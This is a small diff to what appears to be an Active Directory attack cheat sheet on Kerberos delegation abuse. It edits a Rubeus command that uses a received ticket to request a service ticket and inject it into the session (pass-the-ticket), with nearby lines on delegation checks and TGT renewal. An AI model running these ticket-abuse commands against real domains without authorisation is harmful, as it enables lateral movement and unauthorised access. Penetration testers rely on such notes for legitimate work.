@@ -61,7 +61,7 @@ Check the `TRUSTED_FOR_DELEGATION` property.
   ```                                                                                                                                                                 
   Use the recieved ticket to access a resource                                                                                                                        
   ```powershell                                                                                                                                                       
-  .\Rubeus.exe asktgs /ticket:<Recieved Ticket> /service:<SPN> /ptt                                                                                                   
+  .\Rubeus.exe asktgs /ticket:<Recieved Ticket> /service:<SPN> /ptt /nowrap                                                                                                   
   ```                                                                                                                                                                 
   If the above doesn't work, we use renew to get a brand new TGT instead of a TGS
   ```powershell
